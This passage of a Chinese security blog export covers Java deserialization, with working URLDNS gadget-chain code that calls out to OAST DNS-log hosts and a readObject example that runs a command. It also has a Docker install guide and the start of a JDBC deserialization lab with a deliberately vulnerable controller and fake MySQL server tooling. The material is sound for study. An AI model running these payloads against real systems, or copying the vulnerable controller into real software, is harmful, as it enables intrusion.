System.out.println(<span class="string">&quot;Person对象已序列化到person2.ser文件&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person2</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;person2.ser&quot;</span>);  </span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);  </span><br><span class="line">            deserializedPerson = (Person2) in.readObject();  </span><br><span class="line">            in.close();  </span><br><span class="line">            fileIn.close();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化后的Person对象：&quot;</span> + deserializedPerson);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>解析下：</p>
<ul>
<li><code>private transient String status; </code>定义status变量，transient 标识的对象成员变量不参与序列化</li>
<li><code>private void readObject</code>自定义readObject方法，若程序中自定义的readObject代码中存在危险代码，则可能导致危害。<br>示例：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">    in.defaultReadObject();  </span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
在反序列化时，会使用自定义readObject方法，此时则会调用到Runtime执行命令打开计算器。</li>
</ul>
<p>为什么重写readObject：在反序列化过程中需要特殊处理一些属性或者进行一些特定的逻辑，可以通过重写 <code>readObject</code> 和 <code>writeObject</code> 方法来实现。<br><img src="/images/Pasted%20image%2020240619171758.png"></p>
<h2 id="可能造成危险的方式"><a href="#可能造成危险的方式" class="headerlink" title="可能造成危险的方式"></a>可能造成危险的方式</h2><ul>
<li>重写readObject造成危害（少见）</li>
<li>入口类包含可控可控类，该类中存在危险方法的类，或该类会调用其他危险方法的类，反序列化时会调用到。</li>
</ul>
<p>反序列化要求：当前类可被序列化（继承自Serializable），并且重写了readObject，参数类型宽泛，最好是jdk自带的类。</p>
<p>简单解释：序列化A<br>A的要求：继承自Serializable<br>如果A参数类型宽泛，A(B,C);<br>A要通用，比如：我在当前程序1中有这个A，程序2中也有A（最好是jdk自带的类）</p>
<h1 id="Dnslog链分析"><a href="#Dnslog链分析" class="headerlink" title="Dnslog链分析"></a>Dnslog链分析</h1><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>HashMap继承自Serializable<br><img src="/images/Pasted%20image%2020240620141240.png"><br>并且重写了readObject<br><img src="/images/Pasted%20image%2020240620141358.png"></p>
<p>读了key和value，接着调用了hash方法<br><img src="/images/Pasted%20image%2020240620141713.png"></p>
<p>跟进hash方法，如果key不为空，就调用key的hashCode方法<br><img src="/images/Pasted%20image%2020240620142409.png"></p>
<h2 id="Url"><a href="#Url" class="headerlink" title="Url"></a>Url</h2><p>url中存在方法hashCode方法<br><img src="/images/Pasted%20image%2020240620145042.png"><br>如果hashCode等于-1则调用hashCode，hashCode中dns解析了传入的u<br><img src="/images/Pasted%20image%2020240620145131.png"></p>
<h2 id="链分析"><a href="#链分析" class="headerlink" title="链分析"></a>链分析</h2><p>案例1：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    HashMap&lt;URL, Integer&gt; hashmapt = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">    <span class="comment">// 将url类传入hashmap  </span></span><br><span class="line">    hashmapt.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://url.cpps938sfi0uebpoqm70znshpnts6idif.oast.online&quot;</span>), <span class="number">1</span>);  </span><br><span class="line">    <span class="comment">// 通过put设置url目标地址  </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 序列化对象  </span></span><br><span class="line">    <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns.ser&quot;</span>);  </span><br><span class="line">    <span class="comment">// 将数据写入文件，系统将会创建一个新的 person.ser文件，如果该文件已经存在，系统将会覆盖原有文件内容  </span></span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);  </span><br><span class="line">    <span class="comment">// 将数据输出流连接到fileOut对象  </span></span><br><span class="line">    out.writeObject(hashmapt);  </span><br><span class="line">    out.close();  </span><br><span class="line">    fileOut.close();  </span><br><span class="line">    System.out.println(<span class="string">&quot;序列化成功!&quot;</span>);  </span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">    e.printStackTrace();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行发现程序自动访问了该地址<br><img src="/images/Pasted%20image%2020240620144755.png"></p>
<p>调试下，查看调用链，步入put函数<br><img src="/images/Pasted%20image%2020240620150347.png"></p>
<p>调用了java.util.HashMap#hash函数，步入进去<br><img src="/images/Pasted%20image%2020240620150520.png"></p>
<p>调用了key的hashCode函数，实际就是java.net.URL#hashCode<br><img src="/images/Pasted%20image%2020240620150650.png"><br>跟进hashCode<br><img src="/images/Pasted%20image%2020240620150639.png"></p>
<p>再次跟进handler.hashCode，在getHostAddress对域名进行了解析<br><img src="/images/Pasted%20image%2020240620150745.png"></p>
<p>而后进行序列化，实际上hashCode值在上述流程中已经改变，不再是-1，而是对应hash值，所以即使此处序列化成功，我们进行反序列化时也无法进行dns解析。<br><img src="/images/Pasted%20image%2020240620150950.png"></p>
<p>所以如何保证在序列化时hashCode值为-1呢？</p>
<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><blockquote>
<p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。Java反射机制在框架设计中极为广泛，需要深入理解。本文综合多篇文章后，总结了Java 反射的相关知识，希望可以提升你对Java中反射的认知效率。</p>
</blockquote>
<ul>
<li>再来看看 <strong>Class类的方法</strong></li>
</ul>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>forName()</td>
<td>(1)获取Class对象的一个引用，但引用的类还没有加载(该类的第一个对象没有生成)就加载了这个类。</td>
</tr>
<tr>
<td></td>
<td>(2)为了产生Class引用，forName()立即就进行了初始化。</td>
</tr>
<tr>
<td>Object-getClass()</td>
<td>获取Class对象的一个引用，返回表示该对象的实际类型的Class引用。</td>
</tr>
<tr>
<td>getName()</td>
<td>取全限定的类名(包括包名)，即类的完整名字。</td>
</tr>
<tr>
<td>getSimpleName()</td>
<td>获取类名(不包括包名)</td>
</tr>
<tr>
<td>getCanonicalName()</td>
<td>获取全限定的类名(包括包名)</td>
</tr>
<tr>
<td>isInterface()</td>
<td>判断Class对象是否是表示一个接口</td>
</tr>
<tr>
<td>getInterfaces()</td>
<td>返回Class对象数组，表示Class对象所引用的类所实现的所有接口。</td>
</tr>
<tr>
<td>getSupercalss()</td>
<td>返回Class对象，表示Class对象所引用的类所继承的直接基类。应用该方法可在运行时发现一个对象完整的继承结构。</td>
</tr>
<tr>
<td>newInstance()</td>
<td>返回一个Oject对象，是实现“虚拟构造器”的一种途径。使用该方法创建的类，必须带有无参的构造器。</td>
</tr>
<tr>
<td>getFields()</td>
<td>获得某个类的所有的公共（public）的字段，包括继承自父类的所有公共字段。 类似的还有getMethods和getConstructors。</td>
</tr>
<tr>
<td>getDeclaredFields</td>
<td>获得某个类的自己声明的字段，即包括public、private和proteced，默认但是不包括父类声明的任何字段。类似的还有getDeclaredMethods和getDeclaredConstructors。</td>
</tr>
</tbody></table>
<p>获取Constructor对象是通过Class类中的方法获取的，Class类与Constructor相关的主要方法如下：</p>
<table>
<thead>
<tr>
<th>方法返回值</th>
<th>方法名称</th>
<th>方法说明</th>
</tr>
</thead>
<tbody><tr>
<td>static Class&lt;?&gt;</td>
<td>forName(String className)</td>
<td>返回与带有给定字符串名的类或接口相关联的 Class 对象。</td>
</tr>
<tr>
<td>Constructor</td>
<td>getConstructor(Class&lt;?&gt;… parameterTypes)</td>
<td>返回指定参数类型、具有public访问权限的构造函数对象</td>
</tr>
<tr>
<td>Constructor&lt;?&gt;[]</td>
<td>getConstructors()</td>
<td>返回所有具有public访问权限的构造函数的Constructor对象数组</td>
</tr>
<tr>
<td>Constructor</td>
<td>getDeclaredConstructor(Class&lt;?&gt;… parameterTypes)</td>
<td>返回指定参数类型、所有声明的（包括private）构造函数对象</td>
</tr>
<tr>
<td>Constructor&lt;?&gt;[]</td>
<td>getDeclaredConstructors()</td>
<td>返回所有声明的（包括private）构造函数对象</td>
</tr>
<tr>
<td>Constructor&lt;?&gt;[]</td>
<td>getConstructors()</td>
<td>返回所有具有public访问权限的构造函数的Constructor对象数组</td>
</tr>
<tr>
<td>T</td>
<td>newInstance()</td>
<td>调用无参构造器创建此 Class 对象所表示的类的一个新实例。</td>
</tr>
</tbody></table>
<p>案例分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectionTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;admin&quot;</span>,<span class="number">33</span>);  </span><br><span class="line">        <span class="comment">// 实例化Person类  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;反射前：&quot;</span>+person);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">a</span> <span class="operator">=</span> person.getClass();  </span><br><span class="line">        <span class="comment">// 通过反射获取类的原型  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">personConstructor</span> <span class="operator">=</span> a.getConstructor(String.class, <span class="type">int</span>.class);  </span><br><span class="line">        <span class="comment">// 利用getConstructor构造函数而后进行实例化传入参数  </span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> (Person) personConstructor.newInstance(<span class="string">&quot;man&quot;</span>, <span class="number">22</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;反射后：&quot;</span>+p);  </span><br><span class="line">  </span><br><span class="line">        Field[] canshuType = a.getDeclaredFields();  </span><br><span class="line">        <span class="comment">// 获取某个类的自己声明的字段，使用for循环输出其类型  </span></span><br><span class="line">        System.out.println(<span class="string">&quot;输出Person类申明的字段类型：&quot;</span>);  </span><br><span class="line">        <span class="keyword">for</span>(Field i:canshuType)&#123;  </span><br><span class="line">            System.out.println(i);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">canshu</span> <span class="operator">=</span> a.getDeclaredField(<span class="string">&quot;name&quot;</span>);  </span><br><span class="line">        <span class="comment">// 通过getDeclaredField获取类的字段  </span></span><br><span class="line">        canshu.set(p,<span class="string">&quot;zhangsan&quot;</span>);  </span><br><span class="line">        <span class="comment">// 通过set设置字段值  </span></span><br><span class="line">        System.out.println(p);  </span><br><span class="line">        <span class="comment">// 输出修改后的结果  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用反射修改hashCode值而后序列化"><a href="#利用反射修改hashCode值而后序列化" class="headerlink" title="利用反射修改hashCode值而后序列化"></a>利用反射修改hashCode值而后序列化</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Urldnslog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            HashMap&lt;URL, Integer&gt; hashmapt = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            <span class="comment">// 将url类传入hashmap</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://z1sec.cpqn9cosfi0il0kidbb096hu4sxqd4hhw.oast.me&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">n</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">n_value</span> <span class="operator">=</span> n.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">            n_value.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            n_value.set(u,<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">            hashmapt.put(u, <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 通过put设置url目标地址</span></span><br><span class="line"></span><br><span class="line">            n_value.set(u,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 序列化对象</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns2.ser&quot;</span>);</span><br><span class="line">            <span class="comment">// 将数据写入文件，系统将会创建一个新的 person.ser文件，如果该文件已经存在，系统将会覆盖原有文件内容</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">            <span class="comment">// 将数据输出流连接到fileOut对象</span></span><br><span class="line">            out.writeObject(hashmapt);</span><br><span class="line">            out.close();</span><br><span class="line">            fileOut.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;序列化成功!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逐行分析下：</p>
<ul>
<li><p>将url类传入hashmap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;URL, Integer&gt; hashmapt = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br></pre></td></tr></table></figure>
</li>
<li><p>实例化URL对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://cpqn9cosfi0il0kidbb096hu4sxqd4hhw.oast.me&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过反射获取java.net.URL类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">n</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过getDeclaredField反射获取URL类中定义的字段（获取hashCode）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">n_value</span> <span class="operator">=</span> n.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>由于hashCode为私有属性，可通过setAccessible设置变量可被更改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">n_value.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置hashCode值为1000，在下面进行put时调用java.net.URL#hashCode则不会进入java.net.URLStreamHandler#hashCode，进而不会调用到getHostAddress对url进行解析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">n_value.set(u,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过put设置URL实例方便后续序列化调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashmapt.put(u, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>将hashCode重新设置为-1，进行反序列化，进而在反序列化时可调用到getHostAddress，触发解析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">n_value.set(u,-<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>但是运行发现会报错：<br><img src="/images/Pasted%20image%2020240620171602.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.reflect.InaccessibleObjectException: Unable to make field private int java.net.URL.hashCode accessible: module java.base does not &quot;opens java.net&quot; to module com.maven_2.maven_2</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)</span><br><span class="line">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)</span><br><span class="line">	at java.base/java.lang.reflect.Field.checkCanSetAccessible(Field.java:180)</span><br><span class="line">	at java.base/java.lang.reflect.Field.setAccessible(Field.java:174)</span><br><span class="line">	at com.maven_2.maven_2/com.maven_2.Urldnslog.main(Urldnslog.java:21)</span><br></pre></td></tr></table></figure>

<p>解决方式：</p>
<blockquote>
<p>这个问题是因为在 Java 9 及更高版本中，模块化系统的引入导致一些限制，对于非公开的 API 访问做出了更严格的限制。在你的代码中，你试图通过反射修改<code>java.net.URL</code>类中的私有字段<code>hashCode</code>，但是由于模块化系统的限制，你的模块没有权限访问<code>java.net</code>模块中私有成员。</p>
</blockquote>
<p>为了解决这个问题，你可以直接使用jdk8进行编译运行。<br><img src="/images/Pasted%20image%2020240621205737.png"><br><img src="/images/Pasted%20image%2020240621205756.png"><br><img src="/images/Pasted%20image%2020240621205814.png"><br>序列化成功，此时dns是不会有任何记录的。</p>
<p>接着对序列化文件进行反序列化，则会触发getHostAddress对目标域名进行反序列化操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.maven_2;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeSerializationExample1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 反序列化对象  </span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;urldns2.ser&quot;</span>);  </span><br><span class="line">            <span class="comment">// 读取person.ser  </span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn);  </span><br><span class="line">            <span class="comment">// 通过fileIn对象连接到文件中，以便读取文件中序列化的 Java 对象数据，进行反序列化操作  </span></span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) in.readObject();  </span><br><span class="line">            <span class="comment">// // 从文件中读取一个 Java 对象，并将其保存为 Person 类型的变量  </span></span><br><span class="line">            in.close();  </span><br><span class="line">            fileIn.close();  </span><br><span class="line">            System.out.println(deserializedPerson);  </span><br><span class="line">            <span class="comment">// 输出  </span></span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>成功接收到请求：<br><img src="/images/Pasted%20image%2020240621211832.png"></p>
]]></content>
  </entry>
  <entry>
    <title>Centos7安装docker</title>
    <url>/2024/07/04/Centos7%E5%AE%89%E8%A3%85docker/</url>
    <content><![CDATA[<p>删除docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure>

<p>添加docker yum源</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum install -y yum-utils</span><br><span class="line">yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>

<p>安装docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<p>查看docker版本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | <span class="built_in">sort</span> -r</span><br></pre></td></tr></table></figure>

<p>安装指定版本docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum install docker-ce-&lt;VERSION_STRING&gt; docker-ce-cli-&lt;VERSION_STRING&gt; containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<p>启动docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>

<p>测试dockder</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>

<p>使用sh文件安装docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">DRY_RUN=1 sudo sh ./get-docker.sh</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">sudo sh get-docker.sh</span><br></pre></td></tr></table></figure>

<p>删除docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum remove docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">rm</span> -rf /var/lib/docker</span><br><span class="line">sudo <span class="built_in">rm</span> -rf /var/lib/containerd</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>JDBC反序列化分析</title>
    <url>/2024/08/03/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><ul>
<li>mysql-fake-server（推荐）：<a href="https://github.com/4ra1n/mysql-fake-server">https://github.com/4ra1n/mysql-fake-server</a></li>
<li>MySQL_Fake_Server：<a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></li>
<li>Jyso：<a href="https://github.com/qi4L/JYso">https://github.com/qi4L/JYso</a></li>
</ul>
<h1 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h1><p>创建项目时，java版本设置为1.8方面后续操作<br>目前直接使用Spring Initializr创建spring boot应用将无法选择java8版本，将服务器地址设置为阿里云地址即可解决：<a href="https://start.aliyun.com/">https://start.aliyun.com/</a><br>java1.8 JDK对应 java为8版本<br><img src="/images/Pasted%20image%2020240718093833.png"></p>
<p>Maven设置，mysql-connector-java版本应设置到5.1.0-5.1.18或5.1.19-5.1.28或5.1.29-5.1.48或6.0.2-6.0.6或8.0.7-8.0.20范围内，对于不同的版本，Payload也会有所差别。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.29<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 版本号可以根据需要修改 --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 用于使用CC链进行复现 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>写一个controller，用于控制JDBC连接字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.spring.controller;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;  </span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  </span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@RestController</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqltestController</span> &#123;  </span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/jdbctest&quot;)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDataFromRemoteDB</span><span class="params">(String exp, String username, String password)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> exp;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url,username,password);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;over&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>下载mysql-fake-server cli版本（无图形化），java运行即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar fake-mysql-cli-0.0.4.jar -p 60003</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240716161609.png"></p>
<p>注：在黑盒情况下，我们可以通过尝试建立连接来确定目标mysql-connector-java版本以此确定目标是否在攻击范围内。</p>
<h2 id="获取目标版本"><a href="#获取目标版本" class="headerlink" title="获取目标版本"></a>获取目标版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/jdbctest?exp=jdbc:mysql://xxx:60003/test&amp;user=ro&amp;password=123</span><br></pre></td></tr></table></figure>

<p>成功获取版本，5.1.29在可攻击范围内。<br><img src="/images/Pasted%20image%2020240716161906.png"></p>
